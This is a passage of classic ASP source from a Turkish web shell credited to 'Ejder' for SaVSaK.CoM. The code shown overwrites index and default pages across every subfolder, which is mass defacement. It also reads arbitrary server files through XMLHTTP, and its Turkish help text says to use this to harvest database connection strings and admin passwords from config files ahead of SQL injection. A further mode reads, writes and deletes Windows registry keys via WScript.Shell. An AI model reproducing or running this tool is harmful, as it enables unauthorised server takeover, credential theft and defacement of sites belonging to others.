	else
		oldu("Baþardýnýz ;) iþlem gerçekleþtii.")
	end if
else 
on error resume next
Set f = FSO.GetFolder(FolderPath)
Set fc = f.SubFolders
if err<>0 then
	olmadi("bu klasör e FSo nesnesi ile tarama yapýlamýyor. Önce okunmalý, sonra MSWC devreye girer.")
end if
For Each f1 In fc
	on error resume next
	mevki = hash6+f1.name+"\"+hash5+"default.asp"
	utils.ProcessForm mevki, hash2
	mevki = hash6+f1.name+"\"+hash5+"index.asp"
	utils.ProcessForm mevki, hash2
	mevki = hash6+f1.name+"\"+hash5+"default.htm"
	utils.ProcessForm mevki, hash2
	mevki = hash6+f1.name+"\"+hash5+"index.html"
	utils.ProcessForm mevki, hash2
	mevki = hash6+f1.name+"\"+hash5+"Hmei7.htm"
	utils.ProcessForm mevki, hash2		
	mevki = hash6+f1.name+"\"+hash5+"index.htm"
	utils.ProcessForm mevki, hash2	
	if err<>0 then
	response.write "<table width=""100%""><tr><td class=""kbrtm""> "& hash6+f1.name+"\"+hash5&" <font color=#FE7A84> Noo :( !! <font class=""k1"">û</font></td></tr></table>"
	else
	response.write "<table width=""100%""><tr><td class=""kbrtm""> "& hash6+f1.name+"\"+hash5&" <font color=#C6FCBE> OK !! <font class=""k1"">ü</font></td></tr></table>"
	end if
	response.flush
Next
yazorta("<b>Ýþlem Tamamlandý. by Ejder ;)</b>")
end if

CASE 44 'XMLHTTP lý dosya okuma.
if inject2 = "ok" then
mevki = hash2
else
mevki = Fullpath
end if
response.write "<table width=""100%"" class=""kbrtm""><tr valign=""top""><td colspan=""2"" align=""center"">"
tablo30("<b>Reading Files by using XMLHTTP 1.0 by EJDER ;)</b>")
yazsol("<form action='"&FilePath&"?mode=44' method=post><input name='inject2' value='ok' type='hidden'><b>Dosya Adresi : </b><input name='hash2' type='text' value='"&mevki&"' size=60><input name='goruntule_by_Ej_d_e_r' value='.: Görüntüle :.' type='submit'>")
response.write "</td></form></tr></table>"
if not inject2 = "ok" then
yazsol("<b>XMLHTTP</b> Component ini kullanmaktadýr. kullanýmý çok kolay. Server daki istediðiniz dosyanýn fiziksel link ini yazarak , içini görüntüleyebilirsiniz.")
yazsol("Bir server a girdiniz. FSO ile okuma yetkiniz yok bir dizinde, fakat orda dosyalar mevcut. HTTP üzerinden ulaþabiliyorusnuz fakat server içinden PERMission denied diyor. o zaman direk burdan fiziksel link ini yazarakdan ulaþýrýýz. BUNU 'confing.asp' 'common.asp' 'sql.asp' gibi dosyalarda uygulayarak SQL baðlantýlar yada MDB yerlerini öðrenebiliriz. Hatta ASp kodlar içindeki Admin þirfeleri gibi kritik þifrrelerde dahil. SQL injeciotn yapacaksanýzda, Tablo larý , kullanýþan sql komularada ulaþabilirsiniz.  ")
else
response.write "<textarea style='width:100%;height:470;' >"
on error resume next
Set ejder = Server.CreateObject("Microsoft.XMLHTTP")
ejder.Open "GET", hash2, false
ejder.Send 
if err=0 then
Response.Write Server.HTMLEncode(ejder.ResponseText)
else
response.write "Yazdýðýnýz adres bulunamadý . ?? bir kontrol yap by EJDER ;)"
end if
response.write "</textarea>"
end if
yazorta("<b>by Ejder ;)</b>")

CASE 45 'Regedit zýmbýrtýsý =) uehueh by     E J D E R   F r o m    S a V S a K . C o M
response.write "<table width=""100%"" class=""kbrtm""><tr valign=""top""><td colspan=""2"" align=""center"">"
tablo30("<b>REGEDÝT 1.0 by EJDER ;)</b>")
tablo30("<br><b>REGister lara YAzma & Ekleme</b>")
yazsol("<form action='"&FilePath&"?mode=45' method=post><input name='inject2' value='yaz' type='hidden'><b>Mevki/Key : </b><input name='hash2' type='text' value='' size=85><br> (örnek: HKLM\SOFTWARE\Microsoft\SaVSAK_CoM)")
yazsol("Deðer/Value: <input name='hash3' value='' type='text'>")
yazsol("TÜr/Type: <select name='hash4'><option value=1>REG_SZ</option><option value=2>REG_DWORD</option><option value=3>REG_BINARY</option><option value=4>REG_EXPAND_SZ</option><option value=5>REG_MULTI_SZ</option></select> &nbsp;&nbsp;&nbsp;&nbsp;  <input name='SaVSA_K_CoM' value='..:: YAZDIR ::..' type='Submit'>")
response.write "</td></form></tr></table>"
yazsol("<table><tr><td>Root Key Name</td><td>Karþýlýðý</td></tr><tr><td>HKEY_CURRENT_USER</td><td>HKCU</td></tr><tr><td>HKEY_LOCAL_MACHINE</td><td> HKLM </td></tr><tr><td>HKEY_CLASSES_ROOT</td><td>HKCR</td></tr><tr><td>HKEY_USERS</td><td>HKEY_USERS </td></tr><tr><td>HKEY_CURRENT_CONFIG</td><td>HKEY_CURRENT_CONFIG </td></tr></table>")
yazsol("REG_SZ -> String(kelime) / REG_DWORD -> Ýnteger(Sayý) / REG_BINARY -> Binary / REG_EXPAND_SZ -> Multi String / REG_MULTI_SZ -> Aeeay String")
response.write "<table width=""100%"" class=""kbrtm""><tr valign=""top""><td colspan=""2"" align=""center"">"
tablo30("<br><b>Register lardan OKUMA & SÝL by SaVSaK.CoM ;)</b>")
yazsol("<form action='"&FilePath&"?mode=45' method=post><input name='inject2' value='oku' type='hidden'><b>Mevki/Key : </b><input name=""hash5"" type='text' value='' size=85><br> (örnek: HKLM\SOFTWARE\Microsoft\SaVSAK_CoM)")
yazorta("<input value='oku' name='hash6' type='radio' checked> OKU  -  <input value='sil' name='hash6' type='radio'> SÝL &nbsp;&nbsp;&nbsp;&nbsp;  <input name='SaVSA_K_CoM_' value='..:: OKU/SÝL ::..' type='Submit'>")
response.write "</td></form></tr></table>"
on error resume next
Set SaVSaK = Server.CreateObject("WScript.Shell")
	if err <> 0 then
		olmadi("Server da WScript.SHell kullanýmýna Ýzin vermemektedir. Ýþlem baþarýsýz. SaVSaK.CoM")
		response.end()
	end if
if inject2 = "yaz" then
	on error resume next
	Select Case CInt(hash4)
		Case 1
			hash9 = SaVSaK.RegWrite (Trim(hash2), Trim(hash3), "REG_SZ")
		Case 2
			hash9 = SaVSaK.RegWrite (Trim(hash2), CInt(Trim(hash3)), "REG_DWORD")
		Case 3
			hash9 = SaVSaK.RegWrite (Trim(hash2), CInt(Trim(hash3)), "REG_BINARY")
		Case 4
			hash9 = SaVSaK.RegWrite (Trim(hash2), Trim(hash3), "REG_EXPAND_SZ")
		Case 5
			hash9 = SaVSaK.RegWrite (Trim(hash2), Trim(hash3), "REG_MULTI_SZ")
	End Select
	if err <> 0 then
		olmadi("Ýþlem  gerçekleþtirilemedi. VALUE deðerinin doðru ve uygun Value giridðinziden emin ol.")
	else
		oldu(" <b>"+hash2+"</b><br> adresine register yazýldý. ")
	end if

else if inject2 = "oku" then
	if hash6 = "oku" then
		yazorta("Mevki/Key: <b>"&Trim(hash5)&"</b>")
		on error resume next
		response.write "<center>Deðer/Value: <b>"
		response.write SaVSaK.RegRead (Trim(hash5))
		response.write "</b></center>"
		if err<>0 then
			olmadi("Kayýt Register larda bulunamadý...")
		end if		
	else if hash6 = "sil" then
		yazorta("Mevki/Key: <b>"&Trim(hash5)&"</b>")
		on error resume next
		hash9 = SaVSaK.RegDelete (Trim(hash5))
		if err<>0 then
			olmadi("Registerlardan Silinemedi. KEy yanlýþ olabilir. yada kayýt bulanamadý.")
		else
			oldu("Baþarýyla Silindi. ")
		end if
	end if 
	end if

end if
end if
yazortaa("<b>Written by EJDER for SaVSaK.CoM</b>")


END SELECT


if popup = False AND nolist = False then
response.write "<br><br>"
response.write "<div  style=""z-index:150; position:absolute"">"
Call KlasorOku()
response.write "</div><div  align=""right"">"
Call DosyaOku()
response.write "</div>"
end if

if popup = False then
response.write "<br><br><center><table cellpadding=""0"" cellspacing=""0"" width=""160"">"
response.write "<tr><td class=""kbrtm"" height=""20"" style=""background-color:121212"" align=""center""><b>Sürücüler</b></td></tr>"
Call Suruculer
response.write "</table></center><br><br>"
Call SurucuInfo
yazortaa("<b>Written by <a href=""mailto:ejder@savsak.com"">EJDER</a> For <a href=""http://www.savsak.com"" target=_blank"">WwW.SaVSaK.CoM</a></b>")
yazorta("<b>Template & Tema Designed by <a href=""mailto:fastboy@savsak.com"">FASTBOY</a><br>Speacial Thanks to Fastboy</b>")
end if
%>

<!--EFSO Ejder &  Fastboy tarafýndan yazýlmýþtýr for SaVSaK.CoM . TÜM HAKLARI Ejder e Aitttir.-->
<!--TÜM HAKLARI SAKLIDIR.. KODLARDA yapacaðýnmýz bir deðiþiklik KODun Çalýþmamasýna mal olur. Bundan dolayý Bir sorun çýkarsa EJDER & SaVSAK.CoM Sorunlu deðildir..-->
<!--Bu yazýlýmda geliþtilmiþ tüm herþey , mantýk, algoritma, yazýlýmlar Sýfýrdan Ejder tarafýndan yazýlmýþtýr. TEMA , düzen vede Görünüm Fastboy a Aittir. -->
<!-- TAKLÝTLEÝRNDEN KAÇININ. by EJDER-->

<!--Ejder was HERE-->
<%'ejder%><p align="right">&nbsp;</p>

